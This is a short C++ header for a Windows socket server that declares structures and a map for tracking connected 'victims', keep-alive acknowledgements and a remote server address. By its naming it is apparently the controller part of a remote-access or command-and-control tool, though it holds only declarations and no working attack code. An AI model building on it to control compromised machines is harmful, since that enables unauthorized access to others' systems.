#pragma once
#include <winsock2.h>
#include <Ws2tcpip.h>
#include <stdio.h>
#include <time.h>
#include <cstdio>
#include <ctime>
#include <stdlib.h>
#include "Shellapi.h"
#include <unordered_map>
#include <iostream>
#pragma  comment(lib,"ws2_32.lib")

struct victimData {
	char* data;
	bool* connected;
}; 

struct victimAck {
	bool* connected;
	SOCKET* socket_victim;
	sockaddr_in* serAddr;
	char* buf;
};


static victimData* xyz = (victimData*)calloc(1, sizeof(victimData));
static std::unordered_map<std::string, victimData*> victimsMap_c = { { "None",xyz } };

class server
{
public:
	server();
	~server();
	bool runManagerServer(unsigned int local_server_port);
	DWORD acceptConnection();
	SOCKET serverManager;
	SOCKET clientManager;
	static DWORD WINAPI runAcceptServer(void* Param);

	static DWORD WINAPI getAliveAck(void* Param);

	char* remote_server_ip;
	int remote_server_ip_length;
	unsigned int remote_server_port;
	std::unordered_map<std::string, victimData*>* victimsMap = &victimsMap_c;

	std::unordered_map<std::string, victimData*>* getVictimsMap();
};
